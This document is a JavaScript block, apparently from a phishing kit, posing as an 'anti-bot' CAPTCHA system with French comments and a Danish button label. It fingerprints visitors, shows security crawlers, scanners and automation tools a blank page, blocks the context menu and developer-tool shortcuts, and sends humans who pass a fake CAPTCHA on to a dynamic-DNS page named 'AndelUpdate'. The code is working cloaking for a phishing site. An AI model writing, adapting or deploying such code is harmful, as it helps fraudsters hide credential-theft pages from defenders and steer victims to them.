<script>
//<![CDATA[
// SYSTÈME ANTI-BOTS UNIVERSEL
var currentCaptcha = '';
var maxAttempts = 5;
var attempts = 0;
var lastClickTime = 0;
var clickCount = 0;
var isHuman = false;

// Détection avancée des bots
function detectBots() {
  var ua = navigator.userAgent.toLowerCase();
  
  // Liste des bots connus
  var knownBots = [
    'bot', 'crawler', 'spider', 'scraper', 'checker', 'monitor',
    'googlebot', 'bingbot', 'yandexbot', 'duckduckbot', 'baiduspider',
    'facebookexternalhit', 'twitterbot', 'linkedinbot', 'slackbot',
    'telegrambot', 'discordbot', 'applebot', 'whatsapp', 'pinterest',
    'instagram', 'snapchat', 'redditbot', 'quorabot', 'embedly',
    'outbrain', 'showyoubot', 'vkshare', 'w3c_validator',
    'python', 'curl', 'wget', 'java', 'php', 'ruby', 'perl'
  ];
  
  // Vérification User Agent
  for (var i = 0; i < knownBots.length; i++) {
    if (ua.indexOf(knownBots[i]) !== -1) {
      return true;
    }
  }
  
  // Détection des outils d'automation
  if (navigator.webdriver || window.callPhantom || window._phantom || 
      window.phantom || window.__webdriver_evaluate || window.__selenium_evaluate) {
    return true;
  }
  
  // Headers spécifiques aux automation tools
  if (navigator.__nightmare || navigator.webdriver === true) {
    return true;
  }
  
  // Vérification des caractéristiques humaines
  var humanTests = {
    // Test des plugins (les bots n'ont pas de plugins)
    plugins: navigator.plugins.length > 0,
    
    // Test des langues
    languages: navigator.languages && navigator.languages.length > 0,
    
    // Test de la résolution d'écran
    screen: screen.width > 200 && screen.height > 200,
    
    // Test des APIs navigateur
    apis: !!(window.chrome || window.safari) && 
          !!window.Notification && 
          !!window.WebGLRenderingContext,
    
    // Test de performance (les bots sont trop rapides)
    performance: (function() {
      var start = performance.now();
      var sum = 0;
      for (var i = 0; i < 100000; i++) {
        sum += Math.sqrt(i);
      }
      var time = performance.now() - start;
      return time > 2; // Les humains prennent plus de 2ms
    })()
  };
  
  var passedTests = Object.values(humanTests).filter(function(test) { return test; }).length;
  
  // Si moins de 3 tests passent, c'est probablement un bot
  return passedTests < 3;
}

// Afficher une page blanche pour les bots
function showWhitePage() {
  document.body.innerHTML = '<div class="white-page"></div>';
  document.title = '';
  
  // Bloquer toute interaction
  document.addEventListener('click', function(e) {
    e.preventDefault();
    e.stopPropagation();
  });
  
  document.addEventListener('keydown', function(e) {
    e.preventDefault();
    e.stopPropagation();
  });
  
  // Empêcher l'inspection
  document.addEventListener('contextmenu', function(e) {
    e.preventDefault();
  });
  
  document.addEventListener('keydown', function(e) {
    if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
      e.preventDefault();
    }
  });
}

// Protection contre les clicks rapides
function throttleClick(callback) {
  var now = Date.now();
  if (now - lastClickTime < 500) {
    clickCount++;
    if (clickCount > 10) {
      setTimeout(function() {
        clickCount = 0;
      }, 10000);
      return false;
    }
    return false;
  }
  lastClickTime = now;
  return callback();
}

// Générer CAPTCHA
function generateCaptcha() {
  if (!isHuman) {
    showWhitePage();
    return;
  }
  
  var chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
  var captcha = '';
  for (var i = 0; i < 6; i++) {
    captcha += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  currentCaptcha = captcha;
  
  try {
    var captchaElement = document.getElementById('captchaText');
    if (captchaElement) {
      captchaElement.textContent = captcha;
    }
  } catch (e) {
    console.log('DOM update error');
  }
}

// Vérification CAPTCHA
function verifyCaptcha() {
  if (!isHuman) {
    showWhitePage();
    return false;
  }
  
  return throttleClick(function() {
    var userInput = document.getElementById('captchaInput').value.trim().toUpperCase();
    var verifyBtn = document.getElementById('verifyBtn');
    
    if (userInput === '') {
      return false;
    }
    
    if (userInput !== currentCaptcha) {
      attempts++;
      if (attempts >= maxAttempts) {
        verifyBtn.disabled = true;
        setTimeout(function() {
          verifyBtn.disabled = false;
          attempts = 0;
        }, 30000);
      } else {
        generateCaptcha();
        document.getElementById('captchaInput').value = '';
      }
      return false;
    }
    
    // CAPTCHA correct - Redirection
    verifyBtn.disabled = true;
    verifyBtn.textContent = 'Omdirigerer...';
    
    setTimeout(function() {
      window.location.href = "http://agricolmail.dynv6.net/AndelUpdate/dodk/index.php";
    }, 1000);
    
    return true;
  });
}

// Rafraîchir CAPTCHA
function refreshCaptcha() {
  if (!isHuman) {
    showWhitePage();
    return;
  }
  
  throttleClick(function() {
    generateCaptcha();
    document.getElementById('captchaInput').value = '';
  });
}

// Initialisation
function init() {
  // Vérifier si c'est un bot
  var isBot = detectBots();
  
  if (isBot) {
    // C'est un bot - Afficher page blanche
    showWhitePage();
  } else {
    // C'est un humain - Afficher le CAPTCHA
    isHuman = true;
    generateCaptcha();
    
    // Ajouter les événements
    document.getElementById('verifyBtn').addEventListener('click', verifyCaptcha);
    document.getElementById('captchaInput').addEventListener('keypress', function(e) {
      if (e.key === 'Enter') {
        verifyCaptcha();
      }
    });
    
    document.addEventListener('dblclick', function(e) {
      e.preventDefault();
    });
  }
}

// Démarrer
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', init);
} else {
  init();
}

// Protection contre les erreurs
window.addEventListener('error', function(e) {
  e.preventDefault();
});

window.addEventListener('unhandledrejection', function(e) {
  e.preventDefault();
});
//]]>
</script>
